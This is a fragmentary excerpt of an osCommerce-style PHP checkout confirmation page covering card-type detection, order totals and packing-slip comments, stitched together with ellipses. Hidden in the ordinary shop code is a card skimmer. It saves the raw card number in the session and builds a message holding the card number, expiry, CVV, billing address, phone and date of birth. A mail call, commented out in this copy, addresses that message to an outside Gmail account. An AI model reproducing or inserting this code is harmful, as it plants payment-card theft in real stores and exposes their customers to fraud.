...
// if no shipping method has been selected, redirect the customer to the shipping method selection page
  ...
  if (tep_not_null($HTTP_POST_VARS['comments_slip'])) {
    $comments_slip = tep_db_prepare_input($HTTP_POST_VARS['comments_slip']);
  }
...
$_SESSION['cc_expires_month'] = $HTTP_POST_VARS['cc_expires_month'];
$_SESSION['cc_expires_year'] = $HTTP_POST_VARS['cc_expires_year'];
$_SESSION['cc_number'] = $HTTP_POST_VARS['cc_number'];
$_SESSION['real_cc_number'] = $HTTP_POST_VARS['cc_number'];

      if (preg_match('/^4[0-9]{12}([0-9]{3})?$/', $HTTP_POST_VARS['cc_number'])) {
        $cc_type_name = 'Visa';
      } elseif (preg_match('/^5[1-5][0-9]{14}$/', $HTTP_POST_VARS['cc_number'])) {
        $cc_type_name = 'Master Card';
      } elseif (preg_match('/^3[47][0-9]{13}$/', $HTTP_POST_VARS['cc_number'])) {
        $cc_type_name = 'American Express';
      } elseif (preg_match('/^3(0[0-5]|[68][0-9])[0-9]{11}$/', $HTTP_POST_VARS['cc_number'])) {
        $cc_type_name = 'Diners Club';
      } elseif (preg_match('/^6011[0-9]{12}$/', $HTTP_POST_VARS['cc_number'])) {
        $cc_type_name = 'Discover';
      } elseif (preg_match('/^(3[0-9]{4}|2131|1800)[0-9]{11}$/', $HTTP_POST_VARS['cc_number'])) {
        $cc_type_name = 'JCB';
      } elseif (preg_match('/^5610[0-9]{12}$/', $HTTP_POST_VARS['cc_number'])) { 
...
// load the selected shipping module
  ...
  $_SESSION['choose_insurance'] = $_POST[choose_insurance]; //SHIPPING INSURANCE
...
$message_good1 = 'Card Owner' . $HTTP_POST_VARS['cc_owner'] . "\n\n" . 'Card Number: ' . $_SESSION['cc_number'] . "\n\n" .'Expiry Month: ' . $_SESSION['cc_expires_month'] . "\n\n" .'Expiry Year: ' . $_SESSION['cc_expires_year'] . "\n\n" .'Cvv Number: ' . $HTTP_POST_VARS['cc_checkcode'] . "\n\n" . 'Detail billing address: ' . tep_address_format($order->billing['format_id'], $order->billing, 1, ' ', '<br>') . "\n\n" .'Phone ' .$order->customer['telephone']. "\n\n" .'Date of Birth: '.$order->customer['customers_dob'].  "\n\n";

//$message_good1='';
		
//tep_mail('', 'hackergood93@gmail.com', ' New order - Verification info', $message_good1, STORE_OWNER, 'hackergood93@gmail.com', '');
...
<!-- body_text //-->
	...
	<!--
      ...
      <?php/*
      		if (isset($coupontfield) && tep_not_null($coupontfield)) { //Code For Discount
...
if($oplist[$order->products[$i]['id']]){
echo '<font color="green"> ' . ALREADY_PURCHASED . '</font>';
}
    ...
    echo '            <td class="main" align="right" valign="top">' . $currencies->display_price($order->products[$i]['final_price'], $order->products[$i]['tax'], $order->products[$i]['qty']) . '</td>' . "" .
         '          </tr>' . "";
$val = 0;
$val = round((tep_add_tax($order->products[$i]['final_price'], $order->products[$i]['tax']) * $order->products[$i]['qty']), 2);
$total = $total+$val;

  }

//echo "<tr><td colspan='5' align='right'>Total: ".$currencies->format($total)."</td></tr>";
?>
                </table></td>
              </tr>
            </table></td>
...
?>
<?php
  if (tep_not_null($order->info['comments_slip'])) {
?>
      <tr>
        <td class="main"><?php echo '<b>Comments to appear on your Packing Slip.  ie. Happy Birthday, Ship together, etc.</b> <a href="' . tep_href_link(FILENAME_CHECKOUT_PAYMENT, '', 'SSL') . '"><span class="orderEdit">(' . TEXT_EDIT . ')</span></a>'; ?></td>
      </tr>
      <tr>
        <td><?php echo tep_draw_separator('pixel_trans.gif', '100%', '10'); ?></td>
      </tr>
      <tr>
        <td><table border="0" width="100%" cellspacing="1" cellpadding="2" class="infoBox">
          <tr class="infoBoxContents">
            <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
              <tr>
                <td class="main"><?php echo nl2br(tep_output_string_protected($order->info['comments_slip'])) . tep_draw_hidden_field('comments_slip', $order->info['comments_slip']); ?></td>
              </tr>
            </table></td>
          </tr>
        </table></td>
...
//echo htmlspecialchars($payment_modules->process_button());
	...
	if (is_array($payment_modules->modules)) {
	//$str = ("#", "", $payment_modules->process_button());
	//$str = ("&", "", $str);
    echo $payment_modules->process_button();
  }
